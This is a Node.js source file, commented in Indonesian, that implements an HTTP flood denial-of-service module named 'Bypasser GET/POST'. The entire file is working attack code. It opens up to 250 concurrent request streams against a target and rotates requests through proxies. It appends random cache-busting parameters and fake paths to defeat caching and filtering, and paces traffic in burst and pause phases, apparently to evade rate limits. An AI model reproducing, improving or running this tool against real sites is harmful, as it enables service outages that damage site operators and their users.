const axios = require('axios');
const url = require('url');
const crypto = require('crypto');
const { getRandomPayload, proxyList, getAxiosOptions } = require('./extensions');

function runHttpAttack(targetUrl, durationSeconds, attackType) {
    const isPostAttack = attackType === 'post';
    
    const attackName = isPostAttack ? "Bypasser POST" : "Bypasser GET";

    let localSent = 0;
    let localError = 0;

    const target = url.parse(targetUrl);

    const controller = new AbortController();

    // --- Algoritma Pacing Cerdas & Manipulasi Serangan ---
    let attackState = {
        phase: 'RAMP_UP', // RAMP_UP, BURST, PAUSE, RAMP_DOWN
        phaseEndTime: Date.now() + (2000 + Math.random() * 2000),
        streams: 50,
    };
    const ORIGINAL_MAX_STREAMS = 250; // Intensitas dinaikkan sedikit sesuai permintaan
    const MIN_STREAMS = 25; // Batas bawah juga diturunkan

    // --- Kontrol Memori Otomatis untuk Mencegah "Out of Memory" ---
    // Setel batas "aman" di bawah batas heap sebenarnya (--max-old-space-size=1024) untuk memberikan ruang.
    const HEAP_SAFE_LIMIT_MB = 800; 
    const HEAP_SAFE_LIMIT_BYTES = HEAP_SAFE_LIMIT_MB * 1024 * 1024;
    let currentMaxStreams = ORIGINAL_MAX_STREAMS; // Batas stream dinamis yang akan disesuaikan.

    const memoryMonitor = setInterval(() => {
        const heapUsed = process.memoryUsage().heapUsed;
        if (heapUsed > HEAP_SAFE_LIMIT_BYTES) {
            // Memori tinggi, kurangi agresivitas serangan untuk mencegah crash.
            const oldLimit = Math.floor(currentMaxStreams);
            currentMaxStreams = Math.max(MIN_STREAMS, currentMaxStreams * 0.85); // Kurangi batas maksimal sebesar 15%.
            if (Math.floor(currentMaxStreams) < oldLimit) {
                console.warn(`Worker ${process.pid} memory high (${(heapUsed / 1024 / 1024).toFixed(0)}MB). Throttling streams to ${Math.floor(currentMaxStreams)}.`);
            }
        }
    }, 2500); // Periksa memori setiap 2.5 detik.

    // --- URL Fuzzing Tingkat Lanjut ---
    const commonPaths = ['/api/v2/user', '/login', '/shop/item', '/search', '/wp-admin', '/blog/post'];
    const commonParams = ['q', 'id', 'search', 'page', 'user', 'query', 'token'];

    console.log(`Worker ${process.pid} memulai serangan ${attackName} ke ${target.host} selama ${durationSeconds} detik.`);

    let isAttackActive = true;
    let activeRequests = 0; // Lacak permintaan yang sedang berjalan
 
    const fuzzUrl = (originalUrl) => {
        let finalUrl = originalUrl;
        const fuzzChoice = Math.random();

        if (fuzzChoice < 0.1) { // 10% chance to add a fake path
            const fakePath = commonPaths[Math.floor(Math.random() * commonPaths.length)];
            finalUrl = new url.URL(fakePath, originalUrl).href;
        } else if (fuzzChoice < 0.25) { // 15% chance to add a fake query
            const fakeParam = commonParams[Math.floor(Math.random() * commonParams.length)];
            const fakeValue = crypto.randomBytes(8).toString('hex');
            finalUrl += (finalUrl.includes('?') ? '&' : '?') + `${fakeParam}=${fakeValue}`;
        } else if (fuzzChoice < 0.35) { // 10% chance to inject a path segment
            const urlObj = new url.URL(originalUrl);
            let pathSegments = urlObj.pathname.split('/').filter(Boolean);
            if (pathSegments.length > 1) {
                const injectIndex = 1 + Math.floor(Math.random() * (pathSegments.length - 1));
                pathSegments.splice(injectIndex, 0, crypto.randomBytes(4).toString('hex'));
                urlObj.pathname = '/' + pathSegments.join('/');
                finalUrl = urlObj.href;
            }
        }
        // 65% sisanya menyerang URL asli (dengan cache-busting di bawah)

        const cacheBustingParam = `_=${crypto.randomBytes(6).toString('hex')}`;
        return finalUrl + (finalUrl.includes('?') ? '&' : '?') + cacheBustingParam;
    };

    const attack = () => { // Fungsi ini sekarang hanya meluncurkan satu permintaan
        activeRequests++;
        localSent++;

        const finalUrl = fuzzUrl(targetUrl);
        
        const proxyUrl = proxyList.length > 0 ? proxyList[Math.floor(Math.random() * proxyList.length)] : undefined;
        const options = getAxiosOptions(target, proxyUrl, controller.signal);

        const onComplete = () => {
            activeRequests--;
        };
        const onError = (error) => {
            // Jangan hitung error jika permintaan dibatalkan secara sengaja (mis. saat stop)
            if (!axios.isCancel(error)) {
                localError++;
            }
        };

        if (isPostAttack) {
            const { payload, type } = getRandomPayload();
            let data = payload;
            if (type === 'json') {
                // Axios handles JSON objects automatically
            } else { // 'form'
                // Axios handles URLSearchParams for form data
                options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            }
            axios.post(finalUrl, data, options).catch(onError).finally(onComplete);
        } else {
            axios.get(finalUrl, options).catch(onError).finally(onComplete);
        }
    };
 
    const attackLoop = () => {
        if (!isAttackActive) return;

        // Terapkan Algoritma Pacing Cerdas
        if (Date.now() > attackState.phaseEndTime) {
            switch (attackState.phase) {
                case 'RAMP_UP':
                    attackState.phase = 'BURST';
                    attackState.phaseEndTime = Date.now() + (7000 + Math.random() * 5000); // Burst for 7-12s
                    break;
                case 'BURST':
                    attackState.phase = Math.random() > 0.5 ? 'PAUSE' : 'RAMP_DOWN';
                    attackState.phaseEndTime = Date.now() + (1000 + Math.random() * 2000); // Pause/Ramp for 1-3s
                    break;
                case 'PAUSE':
                case 'RAMP_DOWN':
                    attackState.phase = 'RAMP_UP';
                    attackState.phaseEndTime = Date.now() + (2000 + Math.random() * 2000); // Ramp up for 2-4s
                    break;
            }
        }

        // Sesuaikan jumlah stream berdasarkan fase
        switch (attackState.phase) {
            case 'RAMP_UP':
                attackState.streams = Math.min(currentMaxStreams, attackState.streams + 25);
                break;
            case 'BURST':
                attackState.streams = currentMaxStreams; // Gunakan batas dinamis yang sudah disesuaikan dengan memori
                break;
            case 'PAUSE':
                attackState.streams = MIN_STREAMS;
                break;
            case 'RAMP_DOWN':
                attackState.streams = Math.max(MIN_STREAMS, attackState.streams - 25);
                break;
        }
        
        // Pertahankan jumlah koneksi konkuren agar sesuai dengan `attackState.streams`
        // Ini mencegah pembuatan permintaan yang tidak terkendali dan membanjiri event loop.
        while (isAttackActive && activeRequests < attackState.streams) {
            attack();
        }

        // Jadwalkan pemeriksaan berikutnya untuk menambah koneksi jika perlu.
        setTimeout(attackLoop, 50); // Delay ditambah untuk mengurangi agresivitas
    };

    // Lapor statistik secara berkala setiap 5 detik
    const statsInterval = setInterval(() => {
        if (process.send) {
            process.send({
                type: 'stats',
                sent: localSent,
                error: localError
            });
        }
        localSent = 0;
        localError = 0;
    }, 5000);

    attackLoop();

    setTimeout(() => {
        isAttackActive = false;
        // Batalkan semua permintaan jaringan yang sedang berlangsung.
        // Ini adalah langkah kunci untuk memastikan proses dapat keluar dengan bersih
        // tanpa menunggu timeout permintaan yang lama.
        console.log(`Worker ${process.pid} menghentikan serangan dan membatalkan permintaan yang sedang berjalan...`);
        controller.abort();
        clearInterval(memoryMonitor); // Hentikan pemantauan memori

        clearInterval(statsInterval);

        // Kirim sisa statistik sebelum keluar
        if (process.send && (localSent > 0 || localError > 0)) {
            process.send({
                type: 'stats',
                sent: localSent,
                error: localError
            });
        }

        console.log(`Worker ${process.pid} telah menghentikan serangan ${attackName} ke ${target.host}.`);
        // Beri sedikit waktu agar pembatalan selesai sebelum keluar paksa.
        setTimeout(() => {
            process.exit(0);
        }, 500);
    }, durationSeconds * 1000);
}

module.exports = { runHttpAttack };